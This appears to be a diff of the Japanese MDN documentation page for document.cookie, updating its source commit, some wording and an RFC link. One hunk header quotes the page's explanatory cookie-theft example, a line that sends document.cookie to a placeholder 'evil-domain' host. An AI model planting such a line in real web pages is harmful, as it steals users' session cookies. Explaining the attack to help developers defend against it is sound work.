@@ -3,7 +3,7 @@ title: "Document: cookie プロパティ"
 short-title: cookie
 slug: Web/API/Document/cookie
 l10n:
-  sourceCommit: 6acc0b4325c55fd77dc578c5bd7fde008cf26310
+  sourceCommit: fbc9980c0718c3ead40863b20a74fc8535ebcc85
 ---
 
 {{APIRef("DOM")}}
@@ -69,7 +69,7 @@ document.cookie = newCookie;
 
   - `__Secure-` ブラウザーに、セキュアなチャネルを通してリクエストが送信された場合にのみクッキーを含めるよう指示します。
   - `__Host-` ブラウザーに、安全なオリジンからのクッキーのみを使用することに加え、クッキーのスコープをサーバーから渡された path 属性に限定します。
-    サーバーが path 属性を省略した場合は、要求の URI の「ディレクトリ」が使用されます。
+    サーバーが path 属性を省略した場合は、リクエストの URI の「ディレクトリー」が使用されます。
     これは、クッキーが他のドメインに送出されることを防ぐために、 domain 属性が存在してはいけないことも指示します。
     Chrome では、 path 属性は常にオリジンになります。
 
@@ -315,7 +315,7 @@ new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document
 - クッキーを持てば持つほど、サーバーとクライアント間の通信で、より多くのデータが送信されることを忘れないでください。
   これはリクエストを遅くします。
   もし、クライアントだけにデータを持たせ続けたいなら、 [WHATWG DOM ストレージ](/ja/docs/Web/API/Web_Storage_API) を使うことを強くお勧めします。
-- [RFC 2965](https://www.ietf.org/rfc/rfc2965.txt) (5.3 章, "Implementation Limits") は、クッキーのキーまたは値の長さについて**最大長を設けない**よう指定しており、 **arbitrarily large cookies** への対応を実装するよう勧めています。
+- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965) (5.3 章, "Implementation Limits") は、クッキーのキーまたは値の長さについて**最大長を設けない**よう指定しており、 **arbitrarily large cookies** への対応を実装するよう勧めています。
   各ブラウザーの実装では最大値は異なっている可能性があるので、それぞれのブラウザーのドキュメントを参照してください。
 
 `document.cookie` アクセサープロパティの[構文](#構文)は、クッキーのクライアント・サーバー型の性質によるもので、他のクライアント・クライアントストレージメソッド (例えば [localStorage](/ja/docs/Web/API/Web_Storage_API) など) とは異なります。
